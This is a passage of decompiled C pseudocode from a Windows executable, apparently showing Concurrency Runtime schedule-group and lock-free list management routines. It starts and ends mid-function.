  Next = this[2].Next;
  v3 = ((int (__thiscall *)(struct _SINGLE_LIST_ENTRY *))this[7].Next->Next[1].Next)(this[7].Next);
  v9 = (int)Next;
  v4 = v13;
  sub_43914D(5, 4u, v3, v9);
  if ( BYTE1(v13[39].Next[43].Next) )
  {
    sub_43EDBA(v13 - 1, 2);
    goto LABEL_19;
  }
  v5 = v13[39].Next;
  v8 = v13[6].Next;
  v10[0] = 0;
  v11 = 0;
  if ( !((unsigned int (__thiscall *)(struct _SINGLE_LIST_ENTRY *, int *, struct _SINGLE_LIST_ENTRY *, _DWORD, int))v5[19].Next)(
          &v5[10],
          v10,
          v8,
          0,
          9) )
    goto LABEL_18;
  if ( v10[0] == 1 )
    goto LABEL_12;
  UserMathErrorFunction();
  v6 = (struct _SINGLE_LIST_ENTRY *)sub_43600C((int)v4[7].Next, 1);
  v13 = v6;
  UserMathErrorFunction();
  if ( v6 )
  {
    if ( sub_442CA4(v10) )
    {
LABEL_10:
      sub_442681(v10, (int)v6);
LABEL_14:
      sub_43EEF1((int)&v4[-1], (int)v6, 2);
      goto LABEL_19;
    }
    if ( ((unsigned int (__thiscall *)(struct _SINGLE_LIST_ENTRY *, int *, struct _SINGLE_LIST_ENTRY *, _DWORD, int))v4[39].Next[19].Next)(
           &v4[39].Next[10],
           v10,
           v4[6].Next,
           0,
           3) )
    {
      if ( v10[0] != 1 )
      {
        v6 = v13;
        goto LABEL_10;
      }
      sub_437280((int)v4[7].Next, v13, 1);
LABEL_12:
      v6 = v11;
      goto LABEL_13;
    }
    sub_437280((int)v4[7].Next, v13, 1);
    v6 = 0;
  }
  else
  {
    if ( !((unsigned int (__thiscall *)(struct _SINGLE_LIST_ENTRY *, int *, struct _SINGLE_LIST_ENTRY *, _DWORD, int))v4[39].Next[19].Next)(
            &v4[39].Next[10],
            v10,
            v4[6].Next,
            0,
            1) )
      goto LABEL_18;
    v6 = (struct _SINGLE_LIST_ENTRY *)sub_442634(v10);
  }
LABEL_13:
  if ( v6 )
    goto LABEL_14;
LABEL_18:
  LOBYTE(v12) = 1;
LABEL_19:
  result = UserMathErrorFunction();
  if ( (_BYTE)v12 )
    return ((int (__thiscall *)(struct _SINGLE_LIST_ENTRY *))v4[38].Next->Next[3].Next)(v4[38].Next);
  return result;
}

//----- (0043F3E4) --------------------------------------------------------
union _SLIST_HEADER *__thiscall sub_43F3E4(union _SLIST_HEADER *this, int a2, struct _SINGLE_LIST_ENTRY *a3)
{
  char *v4; // ecx
  int v6[7]; // [esp+10h] [ebp-20h] BYREF
  int v7; // [esp+2Ch] [ebp-4h]

  v6[4] = (int)this;
  *(_DWORD *)&this->Depth = 0;
  this[1].Next.Next = 0;
  this->Next.Next = (struct _SINGLE_LIST_ENTRY *)a2;
  sub_434646(this + 2, a2, 256, 64);
  v7 = 0;
  sub_434646(this + 12, a2, 256, 64);
  this[23].Next.Next = a3;
  this[22].Next.Next = 0;
  *(_DWORD *)&this[22].Depth = 0;
  *(_DWORD *)&this[23].Depth = 0;
  memset(v6, 0, 16);
  v4 = *(char **)(a2 + 176);
  LOBYTE(v7) = 1;
  this[1].Next.Next = (struct _SINGLE_LIST_ENTRY *)sub_43FEBA(v4, v6, (int)this);
  return this;
}

//----- (0043F46D) --------------------------------------------------------
void __thiscall sub_43F46D(PSLIST_HEADER ListHead)
{
  PSLIST_ENTRY v2; // esi
  struct _SINGLE_LIST_ENTRY *v3; // ecx
  PSLIST_ENTRY v4; // esi
  struct _SINGLE_LIST_ENTRY *v5; // ecx
  struct _SINGLE_LIST_ENTRY *Next; // esi
  struct _SINGLE_LIST_ENTRY *v7; // eax
  struct _SINGLE_LIST_ENTRY *v8; // ebx
  int i; // esi
  struct _SINGLE_LIST_ENTRY *v10; // esi

  v2 = InterlockedFlushSList(ListHead);
  while ( v2 )
  {
    v3 = v2 - 72;
    v2 = v2->Next;
    sub_43C94B(v3);
  }
  v4 = InterlockedFlushSList(ListHead + 1);
  while ( v4 )
  {
    v5 = v4 - 72;
    v4 = v4->Next;
    sub_43C94B(v5);
  }
  Next = ListHead[2].Next.Next;
  while ( Next )
  {
    v7 = Next - 72;
    Next = Next->Next;
    sub_43C94B(v7);
  }
  v8 = ListHead[6].Next.Next;
  if ( v8 )
  {
    do
    {
      for ( i = 0; i < (int)ListHead[5].Next.Next; ++i )
        sub_43C94B(v8->Next[i].Next);
      v10 = v8[1].Next;
      j_j_j___free_base(v8->Next);
      sub_42CF7C(v8);
      v8 = v10;
    }
    while ( v10 );
  }
  j_j_j___free_base(*(void **)&ListHead[6].Depth);
}

//----- (0043F510) --------------------------------------------------------
void __thiscall sub_43F510(union _SLIST_HEADER *this)
{
  this[1].Next.Next = 0;
  sub_43F46D(this + 12);
  sub_43F46D(this + 2);
}

//----- (0043F528) --------------------------------------------------------
volatile __int32 *__thiscall sub_43F528(volatile __int32 *this)
{
  volatile __int32 *result; // eax

  result = this + 47;
  _InterlockedExchange(this + 47, 1);
  return result;
}

//----- (0043F569) --------------------------------------------------------
char __cdecl sub_43F569(int a1)
{
  char result; // al
  _DWORD *v2; // esi
  int (__thiscall ***v3)(_DWORD, int); // eax

  result = sub_436498(*(_DWORD **)(a1 + 36));
  if ( !result )
  {
    v2 = *(_DWORD **)(a1 + 16);
    while ( v2 )
    {
      v3 = (int (__thiscall ***)(_DWORD, int))(v2 - 72);
      v2 = (_DWORD *)*v2;
      sub_43C94B(v3);
    }
    *(_DWORD *)(a1 + 16) = 0;
    result = a1 + 72;
    _InterlockedExchange((volatile __int32 *)(a1 + 72), 0);
  }
  return result;
}

//----- (0043F575) --------------------------------------------------------
char __thiscall sub_43F575(PSLIST_HEADER ListHead, struct _SINGLE_LIST_ENTRY *a2, int a3, char a4)
{
  int v5; // edx
  int v6; // ebx
  struct _SINGLE_LIST_ENTRY *Next; // ecx
  int v8; // eax
  int v9; // edx
  int v10; // edi
  int v11; // edx
  USHORT DepthSList; // ax
  struct _SINGLE_LIST_ENTRY *v13; // eax
  struct _SINGLE_LIST_ENTRY *v15; // [esp-4h] [ebp-18h]
  int v16; // [esp-4h] [ebp-18h]

  v5 = a3 >> *(_DWORD *)&ListHead[5].Depth;
  v6 = a3 & ((int)&ListHead[5].Next.Next[-1].Next + 3);
  if ( v5 >= *(_DWORD *)&ListHead[7].Depth )
    return 0;
  Next = ListHead[7].Next.Next;
  v8 = *(_DWORD *)&ListHead[6].Depth;
  if ( v5 < (int)Next )
  {
    v10 = *(_DWORD *)(v8 + 4 * v5);
  }
  else
  {
    v9 = v5 - (_DWORD)Next;
    v10 = *(_DWORD *)(v8 + 4 * (_DWORD)Next - 4);
    if ( v9 >= 0 )
    {
      v11 = v9 + 1;
      do
      {
        v10 = *(_DWORD *)(v10 + 4);
        --v11;
      }
      while ( v11 );
    }
  }
  if ( (struct _SINGLE_LIST_ENTRY *)_InterlockedCompareExchange(
                                      (volatile signed __int32 *)(*(_DWORD *)v10 + 4 * v6),
                                      0,
                                      (signed __int32)a2) != a2 )
    return 0;
  _InterlockedCompareExchange((volatile signed __int32 *)(v10 + 8), v6, -2);
  if ( a4 )
  {
    DepthSList = QueryDepthSList(ListHead);
    v15 = a2 + 72;
    if ( DepthSList <= *(int *)&ListHead[8].Depth )
    {
      InterlockedPushEntrySList(ListHead, v15);
    }
    else
    {
      InterlockedPushEntrySList(ListHead + 1, v15);
      if ( QueryDepthSList(ListHead + 1) > *(int *)&ListHead[8].Depth
        && !sub_436498(*(_DWORD **)&ListHead[4].Depth)
        && !_InterlockedCompareExchange((volatile signed __int32 *)&ListHead[9], 1, 0) )
      {
        v13 = InterlockedFlushSList(ListHead + 1);
        v16 = *(_DWORD *)&ListHead[4].Depth;
        ListHead[2].Next.Next = v13;
        sub_436B3C(
          (int (__cdecl **)(int))&ListHead[2].Depth,
          (int (__cdecl *)(int))sub_43F569,
          (int (__cdecl *)(int))ListHead,
          v16);
      }
    }
  }
  return 1;
}

//----- (0043F669) --------------------------------------------------------
char __thiscall sub_43F669(char *this, int a2)
{
  return sub_43F575(
           (PSLIST_HEADER)&this[((*(_DWORD *)(a2 + 12) & 0xFFFFFFF) != 0 ? 0xFFFFFFB0 : 0) + 96],
           (struct _SINGLE_LIST_ENTRY *)a2,
           *(_DWORD *)(a2 + 248),
           1);
}

//----- (0043F698) --------------------------------------------------------
int *__thiscall sub_43F698(int *this, int a2, int a3, char a4, unsigned int a5)
{
  int v6; // ebx
  _DWORD *v7; // edi
  _DWORD *v8; // eax

  v6 = (int)(this + 1);
  v7 = 0;
  *this = a2;
  this[1] = 0;
  this[2] = 0;
  this[3] = a5;
  this[4] = 0;
  this[5] = 0;
  this[6] = 0;
  this[7] = 0;
  this[8] = 0;
  sub_4402AA(this, (int)(this + 1));
  if ( !a4 )
  {
    v8 = operator new(0x2Cu);
    if ( v8 )
      v7 = sub_43F829(v8, *this, v6, a5, 0);
    this[4] = (int)v7;
    this[5] = (int)v7;
  }
  return this;
}

//----- (0043F70F) --------------------------------------------------------
int __thiscall sub_43F70F(int this, int a2, _DWORD *a3)
{
  *(_DWORD *)this = &Concurrency::details::ScheduleGroupBase::`vftable';
  *(_DWORD *)(this + 4) = a2;
  *(_DWORD *)(this + 8) = 0;
  *(_DWORD *)(this + 12) = 0;
  *(_DWORD *)(this + 16) = 0;
  *(_DWORD *)(this + 20) = 0;
  *(_DWORD *)(this + 32) = 0;
  *(_DWORD *)(this + 36) = 0;
  *(_DWORD *)(this + 40) = 0;
  *(_DWORD *)(this + 44) = 0;
  sub_4402D3((int *)this, a3);
  *(_DWORD *)(this + 28) = sub_43613C(*(volatile signed __int32 **)(this + 4));
  return this;
}
// 4717EC: using guessed type void *Concurrency::details::ScheduleGroupBase::`vftable';

//----- (0043F768) --------------------------------------------------------
_DWORD *__thiscall sub_43F768(_DWORD *this, int a2, int a3, _DWORD *a4)
{
  _DWORD *v5; // eax
  int v7; // [esp-10h] [ebp-38h]
  int v8; // [esp-Ch] [ebp-34h]
  void *v9[5]; // [esp+10h] [ebp-18h] BYREF
  int v10; // [esp+24h] [ebp-4h]

  v9[2] = this;
  *this = &Concurrency::details::ScheduleGroupSegmentBase::`vftable';
  this[3] = 0;
  this[4] = 0;
  this[5] = 0;
  this[6] = 0;
  this[7] = 0;
  this[8] = 0;
  this[10] = 0;
  this[11] = this + 10;
  this[12] = 0;
  v10 = 0;
  v5 = sub_435E59(*(unsigned int **)(a2 + 4), v9, this + 3);
  v7 = *(_DWORD *)(a2 + 4);
  LOBYTE(v10) = 1;
  sub_43F698(this + 13, v7, (int)v5, 0, 0x40u);
  LOBYTE(v10) = 3;
  j_j_j___free_base(v9[1]);
  sub_434646((PSLIST_HEADER)this + 11, *(_DWORD *)(a2 + 4), 256, 64);
  v8 = *(_DWORD *)(a2 + 4);
  LOBYTE(v10) = 4;
  sub_434646((PSLIST_HEADER)this + 21, v8, 256, 0x7FFFFFFF);
  this[66] = 0;
  this[67] = 0;
  LOBYTE(v10) = 5;
  sub_4402E6((int)this, a2, a3, a4);
  return this;
}
// 4717D8: using guessed type void *Concurrency::details::ScheduleGroupSegmentBase::`vftable';

//----- (0043F829) --------------------------------------------------------
_DWORD *__thiscall sub_43F829(_DWORD *this, int a2, int a3, unsigned int a4, int a5)
{
  _DWORD *v6; // ecx
  void *v7; // eax

  v6 = this + 1;
  *this = a2;
  *v6 = 0;
  v6[1] = 0;
  sub_4357D5((int)v6, a3);
  this[4] = a5;
  this[5] = 0;
  this[6] = 0;
  v7 = (void *)unknown_libname_45((unsigned __int64)a4 >> 30 != 0 ? -1 : 4 * a4);
  this[3] = v7;
  memset(v7, 0, 4 * a4);
  return this;
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);

//----- (0043F895) --------------------------------------------------------
void __thiscall sub_43F895(PSLIST_HEADER ListHead)
{
  PSLIST_ENTRY v2; // esi
  struct _SINGLE_LIST_ENTRY *v3; // ecx
  PSLIST_ENTRY v4; // esi
  struct _SINGLE_LIST_ENTRY *v5; // ecx
  struct _SINGLE_LIST_ENTRY *Next; // esi
  struct _SINGLE_LIST_ENTRY *v7; // eax
  struct _SINGLE_LIST_ENTRY *v8; // ebx
  int i; // esi
  struct _SINGLE_LIST_ENTRY *v10; // esi

  v2 = InterlockedFlushSList(ListHead);
  while ( v2 )
  {
    v3 = v2 - 1;
    v2 = v2->Next;
    sub_42CF7C(v3);
  }
  v4 = InterlockedFlushSList(ListHead + 1);
  while ( v4 )
  {
    v5 = v4 - 1;
    v4 = v4->Next;
    sub_42CF7C(v5);
  }
  Next = ListHead[2].Next.Next;
  while ( Next )
  {
    v7 = Next - 1;
    Next = Next->Next;
    sub_42CF7C(v7);
  }
  v8 = ListHead[6].Next.Next;
  if ( v8 )
  {
    do
    {
      for ( i = 0; i < (int)ListHead[5].Next.Next; ++i )
        sub_42CF7C(v8->Next[i].Next);
      v10 = v8[1].Next;
      j_j_j___free_base(v8->Next);
      sub_42CF7C(v8);
      v8 = v10;
    }
    while ( v10 );
  }
  j_j_j___free_base(*(void **)&ListHead[6].Depth);
}

//----- (0043F93B) --------------------------------------------------------
void __thiscall sub_43F93B(PSLIST_HEADER ListHead)
{
  PSLIST_ENTRY v2; // eax
  PSLIST_ENTRY v3; // eax
  struct _SINGLE_LIST_ENTRY *Next; // ebx
  int i; // esi
  void **p_Next; // ecx
  struct _SINGLE_LIST_ENTRY *v7; // esi

  v2 = InterlockedFlushSList(ListHead);
  sub_4388AE(v2);
  v3 = InterlockedFlushSList(ListHead + 1);
  sub_4388AE(v3);
  sub_4388AE(&ListHead[2].Next.Next->Next);
  Next = ListHead[6].Next.Next;
  if ( Next )
  {
    do
    {
      for ( i = 0; i < (int)ListHead[5].Next.Next; ++i )
      {
        p_Next = (void **)&Next->Next[i].Next->Next;
        if ( p_Next )
          sub_4383AD(p_Next, 1);
      }
      v7 = Next[1].Next;
      j_j_j___free_base(Next->Next);
      sub_42CF7C(Next);
      Next = v7;
    }
    while ( v7 );
  }
  j_j_j___free_base(*(void **)&ListHead[6].Depth);
}

//----- (0043F9B7) --------------------------------------------------------
void __thiscall sub_43F9B7(int this)
{
  int v2; // ecx
  int v3; // edi
  unsigned int v4; // eax

  v2 = *(_DWORD *)(this + 20);
  if ( v2 )
  {
    do
    {
      v3 = *(_DWORD *)(v2 + 24);
      if ( v2 == *(_DWORD *)(this + 16) )
        v4 = *(_DWORD *)(this + 28) - *(_DWORD *)(v2 + 16);
      else
        v4 = *(_DWORD *)(this + 12);
      sub_4408B4(v2, v4);
      v2 = v3;
    }
    while ( v3 );
  }
  j_j_j___free_base(*(void **)(this + 8));
}

//----- (0043FA1B) --------------------------------------------------------
void __thiscall sub_43FA1B(signed __int32 this)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 12) & 0xFFFFFFF;
  *(_DWORD *)this = &Concurrency::details::ScheduleGroupSegmentBase::`vftable';
  if ( v2 == 3 )
    sub_43FE95(*(_DWORD **)(*(_DWORD *)(this + 256) + 4), *(_DWORD *)(this + 36), this);
  sub_43F895((PSLIST_HEADER)(this + 168));
  sub_43F93B((PSLIST_HEADER)(this + 88));
  sub_43F9B7(this + 52);
  j_j_j___free_base(*(void **)(this + 32));
}
// 4717D8: using guessed type void *Concurrency::details::ScheduleGroupSegmentBase::`vftable';

//----- (0043FA69) --------------------------------------------------------
void **__thiscall sub_43FA69(void **this, void **a2)
{
  void **result; // eax

  j_j_j___free_base(this[1]);
  *this = *a2;
  this[1] = a2[1];
  result = this;
  *a2 = 0;
  a2[1] = 0;
  return result;
}

//----- (0043FA93) --------------------------------------------------------
void *__thiscall sub_43FA93(void *Block, char a2)
{
  sub_43FA1B((signed __int32)Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (0043FAB8) --------------------------------------------------------
volatile signed __int32 *__thiscall sub_43FAB8(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // esi
  volatile signed __int32 *v3; // edi
  int v4; // ebx
  volatile signed __int32 *v5; // eax
  signed __int32 v6; // edx
  signed __int32 v7; // eax
  char v8; // al
  volatile __int32 *v9; // edi
  void *v10; // eax
  int *v11; // ecx
  int v12; // eax
  int v13; // edx
  size_t v15; // [esp-8h] [ebp-38h]
  char v16[8]; // [esp+Ch] [ebp-24h] BYREF
  int v17; // [esp+14h] [ebp-1Ch]
  int (*v18)(); // [esp+18h] [ebp-18h]
  int v19; // [esp+1Ch] [ebp-14h]
  volatile signed __int32 *v20; // [esp+20h] [ebp-10h]
  _DWORD *v21; // [esp+24h] [ebp-Ch]
  volatile signed __int32 *v22; // [esp+28h] [ebp-8h]
  char v23; // [esp+2Fh] [ebp-1h]

  v2 = this;
  v23 = 0;
  v21 = this;
  v3 = 0;
  v4 = this[12];
  do
  {
    if ( *(int *)(v4 + 8) < -1 )
      goto LABEL_9;
    v5 = *(volatile signed __int32 **)v4;
    v6 = 0;
    v22 = *(volatile signed __int32 **)v4;
    if ( (int)v2[10] <= 0 )
    {
LABEL_8:
      v8 = v23;
      if ( v23 )
        goto LABEL_25;
LABEL_9:
      _InterlockedCompareExchange((volatile signed __int32 *)(v4 + 8), -2, -1);
      v22 = (volatile signed __int32 *)((char *)v3 + v2[10]);
      v9 = (volatile __int32 *)(v4 + 4);
      if ( !*(_DWORD *)(v4 + 4) && !_InterlockedCompareExchange(v9, 1, 0) )
      {
        v10 = (void *)unknown_libname_45((unsigned __int64)(unsigned int)v2[10] >> 30 != 0 ? -1 : 4 * v2[10]);
        v15 = 4 * v2[10];
        v19 = (int)v10;
        memset(v10, 0, v15);
        v11 = (int *)operator new(0xCu);
        v20 = v11;
        if ( v11 )
        {
          v12 = v19;
          v11[1] = 0;
          v11[2] = -1;
          *v11 = v12;
        }
        else
        {
          v11 = 0;
        }
        v13 = v2[15];
        if ( v13 < v2[14] )
        {
          *(_DWORD *)(v2[13] + 4 * v13) = v11;
          ++v2[15];
        }
        _InterlockedExchange(v9, (__int32)v11);
      }
      if ( *v9 == 1 )
      {
        v17 = 0;
        v18 = sub_43055D;
        do
          sub_42E8F5((int)v16);
        while ( *v9 == 1 );
      }
      v3 = v22;
      goto LABEL_24;
    }
    while ( *v5 )
    {
LABEL_7:
      ++v6;
      v22 = ++v5;
      if ( v6 >= v2[10] )
        goto LABEL_8;
    }
    v20 = (volatile signed __int32 *)((char *)v3 + v6);
    *a2 = (char *)v3 + v6;
    v19 = v2[16];
    v7 = _InterlockedCompareExchange(v22, (signed __int32)a2, 0);
    v2 = v21;
    if ( v7 )
    {
      v5 = v22;
      goto LABEL_7;
    }
    v3 = v20;
    v23 = 1;
    if ( (int)v20 >= v19 )
      _InterlockedIncrement(v21 + 16);
    _InterlockedCompareExchange((volatile signed __int32 *)(v4 + 8), -1, v6);
LABEL_24:
    v8 = v23;
LABEL_25:
    v4 = *(_DWORD *)(v4 + 4);
  }
  while ( !v8 );
  return v3;
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);
// 43FAB8: using guessed type char var_24[8];

//----- (0043FC13) --------------------------------------------------------
volatile signed __int32 *__thiscall sub_43FC13(_DWORD *this, signed __int32 a2)
{
  _DWORD *v2; // esi
  volatile signed __int32 *v3; // edi
  int v4; // ebx
  volatile signed __int32 *v5; // eax
  signed __int32 v6; // edx
  signed __int32 v7; // eax
  char v8; // al
  volatile __int32 *v9; // edi
  void *v10; // eax
  int *v11; // ecx
  int v12; // eax
  int v13; // edx
  size_t v15; // [esp-8h] [ebp-38h]
  char v16[8]; // [esp+Ch] [ebp-24h] BYREF
  int v17; // [esp+14h] [ebp-1Ch]
  int (*v18)(); // [esp+18h] [ebp-18h]
  int v19; // [esp+1Ch] [ebp-14h]
  volatile signed __int32 *v20; // [esp+20h] [ebp-10h]
  _DWORD *v21; // [esp+24h] [ebp-Ch]
  volatile signed __int32 *v22; // [esp+28h] [ebp-8h]
  char v23; // [esp+2Fh] [ebp-1h]

  v2 = this;
  v23 = 0;
  v21 = this;
  v3 = 0;
  v4 = this[12];
  do
  {
    if ( *(int *)(v4 + 8) < -1 )
      goto LABEL_9;
    v5 = *(volatile signed __int32 **)v4;
    v6 = 0;
    v22 = *(volatile signed __int32 **)v4;
    if ( (int)v2[10] <= 0 )
    {
LABEL_8:
      v8 = v23;
      if ( v23 )
        goto LABEL_25;
LABEL_9:
      _InterlockedCompareExchange((volatile signed __int32 *)(v4 + 8), -2, -1);
      v22 = (volatile signed __int32 *)((char *)v3 + v2[10]);
      v9 = (volatile __int32 *)(v4 + 4);
      if ( !*(_DWORD *)(v4 + 4) && !_InterlockedCompareExchange(v9, 1, 0) )
      {
        v10 = (void *)unknown_libname_45((unsigned __int64)(unsigned int)v2[10] >> 30 != 0 ? -1 : 4 * v2[10]);
        v15 = 4 * v2[10];
        v19 = (int)v10;
        memset(v10, 0, v15);
        v11 = (int *)operator new(0xCu);
        v20 = v11;
        if ( v11 )
        {
          v12 = v19;
          v11[1] = 0;
          v11[2] = -1;
          *v11 = v12;
        }
        else
        {
          v11 = 0;
        }
        v13 = v2[15];
        if ( v13 < v2[14] )
        {
          *(_DWORD *)(v2[13] + 4 * v13) = v11;
          ++v2[15];
        }
        _InterlockedExchange(v9, (__int32)v11);
      }
      if ( *v9 == 1 )
      {
        v17 = 0;
        v18 = sub_43055D;
        do
          sub_42E8F5((int)v16);
        while ( *v9 == 1 );
      }
      v3 = v22;
      goto LABEL_24;
    }
    while ( *v5 )
    {
LABEL_7:
      ++v6;
      v22 = ++v5;
      if ( v6 >= v2[10] )
        goto LABEL_8;
    }
    v20 = (volatile signed __int32 *)((char *)v3 + v6);
    *(_DWORD *)(a2 + 248) = (char *)v3 + v6;
    v19 = v2[16];
    v7 = _InterlockedCompareExchange(v22, a2, 0);
    v2 = v21;
    if ( v7 )
    {
      v5 = v22;
      goto LABEL_7;
    }
    v3 = v20;
    v23 = 1;
    if ( (int)v20 >= v19 )
      _InterlockedIncrement(v21 + 16);
    _InterlockedCompareExchange((volatile signed __int32 *)(v4 + 8), -1, v6);
LABEL_24:
    v8 = v23;
LABEL_25:
    v4 = *(_DWORD *)(v4 + 4);
  }
  while ( !v8 );
  return v3;
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);
// 43FC13: using guessed type char var_24[8];

//----- (0043FD72) --------------------------------------------------------
int __thiscall sub_43FD72(_DWORD *this, int a2, int a3, int a4, int a5, int a6)
{
  _DWORD *v7; // eax
  int v8; // ebx
  unsigned __int8 (__thiscall *v9)(int, int, int, int, int, int); // esi
  int result; // eax
  int v11; // [esp-14h] [ebp-34h] BYREF
  int v12; // [esp-10h] [ebp-30h] BYREF
  int v13; // [esp-Ch] [ebp-2Ch]
  int v14; // [esp-8h] [ebp-28h]
  int v15; // [esp-4h] [ebp-24h]
  int v16[5]; // [esp+Ch] [ebp-14h] BYREF

  v7 = sub_4359BC();
  if ( !v7 || (_DWORD *)sub_41DA9B(v7) != this )
    *(_DWORD *)(a2 + 228) = 1;
  v8 = *(_DWORD *)(this[64] + 4);
  if ( *(int *)(v8 + 440) <= 0
    || (v9 = *(unsigned __int8 (__thiscall **)(int, int, int, int, int, int))(*(_DWORD *)v8 + 60),
        sub_4380FD(&v12, &a3),
        !v9(v8, a2, v12, v13, v14, v15)) )
  {
    (*(void (__thiscall **)(_DWORD *, int))(*this + 8))(this, a2);
    if ( (this[3] & 0xFFFFFFF) != 0 && sub_438310(&a3, this + 3) )
      (*(void (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( *(int *)(v8 + 436) > 0 )
    {
      sub_4380FD(v16, &a3);
      v15 = 11;
      sub_4380FD(&v11, v16);
      sub_4379A2((unsigned int *)v8, (int)this, v11, v12, v13, v14, v15);
    }
  }
  result = a2;
  *(_DWORD *)(a2 + 228) = 0;
  return result;
}
// 43FD72: using guessed type int var_14[5];

//----- (0043FE89) --------------------------------------------------------
char __cdecl sub_43FE89(int a1)
{
  char result; // al
  _DWORD *v2; // esi
  _DWORD *v3; // eax

  result = sub_436498(*(_DWORD **)(a1 + 36));
  if ( !result )
  {
    v2 = *(_DWORD **)(a1 + 16);
    while ( v2 )
    {
      v3 = v2 - 1;
      v2 = (_DWORD *)*v2;
      sub_42CF7C(v3);
    }
    *(_DWORD *)(a1 + 16) = 0;
    result = a1 + 72;
    _InterlockedExchange((volatile __int32 *)(a1 + 72), 0);
  }
  return result;
}

//----- (0043FE95) --------------------------------------------------------
signed __int32 __thiscall sub_43FE95(_DWORD *this, int a2, signed __int32 a3)
{
  signed __int32 result; // eax

  result = a3;
  if ( *(_DWORD *)((a2 << 7) + this[23]) == a3 )
    return _InterlockedCompareExchange((volatile signed __int32 *)((a2 << 7) + this[23]), 0, a3);
  return result;
}

//----- (0043FEBA) --------------------------------------------------------
int __thiscall sub_43FEBA(char *this, _DWORD *a2, int a3)
{
  int v3; // eax
  int *v4; // ebx
  bool v5; // zf
  union _SLIST_HEADER *v6; // eax
  PSLIST_ENTRY v7; // eax
  int v8; // esi

  v3 = *a2 & 0xFFFFFFF;
  v4 = (int *)&this[4 * (v3 == 0) + 12];
  v5 = v3 == 0;
  v6 = (union _SLIST_HEADER *)(a3 + 96);
  if ( !v5 )
    v6 = (union _SLIST_HEADER *)(a3 + 16);
  v7 = InterlockedPopEntrySList(v6);
  if ( !v7 || (v8 = (int)&v7[-72], v7 == (PSLIST_ENTRY)288) )
    v8 = (*(int (__thiscall **)(char *, int, _DWORD *))(*(_DWORD *)this + 32))(this, a3, a2);
  else
    sub_4402E6(v8, (int)this, a3, a2);
  *(_DWORD *)(v8 + 260) = *v4;
  *v4 = v8;
  if ( !*(_DWORD *)(a3 + 188) )
    sub_43F528((volatile __int32 *)a3);
  sub_43FC13((_DWORD *)(a3 + ((*a2 & 0xFFFFFFF) != 0 ? 16 : 96)), v8);
  return v8;
}

//----- (0043FF6B) --------------------------------------------------------
void __thiscall sub_43FF6B(_DWORD *this)
{
  volatile signed __int32 *v2; // edi
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  char v5[8]; // [esp+10h] [ebp-20h] BYREF
  int v6; // [esp+18h] [ebp-18h]
  void (*v7)(); // [esp+1Ch] [ebp-14h]
  void *Block; // [esp+20h] [ebp-10h]
  int v9; // [esp+2Ch] [ebp-4h]

  v2 = this + 4;
  if ( !this[4] && !_InterlockedCompareExchange(v2, 1, 0) )
  {
    v3 = operator new(0x2Cu);
    Block = v3;
    v9 = 0;
    if ( v3 )
      v4 = sub_43F829(v3, *this, (int)(this + 1), this[3], 0);
    else
      v4 = 0;
    v9 = -1;
    *v2 = (volatile signed __int32)v4;
    this[5] = v4;
  }
  if ( !this[5] )
  {
    v6 = 0;
    v7 = sub_43051F;
    do
      sub_42E8F5((int)v5);
    while ( !this[5] );
  }
}
// 43FF6B: using guessed type char var_20[8];

//----- (0043FFE1) --------------------------------------------------------
char __thiscall sub_43FFE1(volatile signed __int32 *this, _DWORD *a2)
{
  int v2; // ebx
  volatile signed __int32 *v3; // edx
  unsigned __int32 i; // esi
  signed __int32 v5; // eax
  _DWORD *v6; // ecx
  signed __int32 *v7; // eax
  signed __int32 v8; // edx
  _DWORD *v9; // edi
  int v10; // eax
  int v11; // esi
  char v12; // al
  int v14[2]; // [esp+Ch] [ebp-18h] BYREF
  volatile signed __int32 *v15; // [esp+14h] [ebp-10h]
  volatile signed __int32 *v16; // [esp+18h] [ebp-Ch]
  int v17; // [esp+1Ch] [ebp-8h]
  _DWORD *v18; // [esp+20h] [ebp-4h]

  v2 = (int)this;
  v15 = this;
  v3 = this + 6;
LABEL_2:
  for ( i = *v3; i != *(_DWORD *)(v2 + 28); i = v5 )
  {
    v5 = _InterlockedCompareExchange(v3, i + 1, i);
    if ( v5 == i )
    {
      v6 = sub_44037D((int *)v2, i, 0);
      v7 = (signed __int32 *)(v2 + 20);
      v18 = v6;
      v16 = (volatile signed __int32 *)(v2 + 20);
      if ( v6 != *(_DWORD **)(v2 + 20) )
      {
        v8 = *v7;
        v9 = (_DWORD *)*v7;
        while ( 1 )
        {
          while ( !(*(_DWORD *)(v2 + 12) + v9[5]) )
            v9 = (_DWORD *)v9[6];
          if ( v9[4] <= *(_DWORD *)(v8 + 16) )
            break;
          v10 = _InterlockedCompareExchange(v16, (signed __int32)v9, v8);
          v2 = (int)v15;
          v17 = v10;
          if ( v10 == v8 )
          {
            while ( (_DWORD *)v10 != v9 )
            {
              sub_4408B4(v10, *(_DWORD *)(v2 + 12));
              v10 = *(_DWORD *)(v17 + 24);
              v17 = v10;
            }
            break;
          }
          v9 = (_DWORD *)v10;
          v8 = v10;
        }
        v6 = v18;
      }
      v11 = i - v6[4];
      v14[0] = (int)v6;
      v14[1] = v11;
      v12 = sub_43875A(v14, a2);
      v3 = (volatile signed __int32 *)(v2 + 24);
      if ( v12 )
        return 1;
      goto LABEL_2;
    }
  }
  return 0;
}

//----- (004400A3) --------------------------------------------------------
int __thiscall sub_4400A3(int *this)
{
  _DWORD *v2; // esi
  int v3; // edi

  v2 = this + 2;
  sub_4304D3(this + 2);
  v3 = sub_4358E1(this);
  sub_430514(v2);
  return v3;
}

//----- (004400D7) --------------------------------------------------------
volatile signed __int32 *__thiscall sub_4400D7(_DWORD *this, int a2)
{
  int v3; // eax

  v3 = this[64];
  if ( (*(_BYTE *)(v3 + 48) & 4) == 0 )
    _InterlockedIncrement((volatile signed __int32 *)(v3 + 20));
  sub_4404FA(a2 + 76);
  _InterlockedExchange((volatile __int32 *)(a2 + 56), 1);
  return sub_43FAB8(this + 42, (_DWORD *)(a2 + 44));
}

//----- (00440116) --------------------------------------------------------
int __thiscall sub_440116(int this, int a2)
{
  sub_4304D3((volatile __int32 *)(this + 8));
  *(_DWORD *)(a2 + 12) = 0;
  **(_DWORD **)(this + 4) = a2;
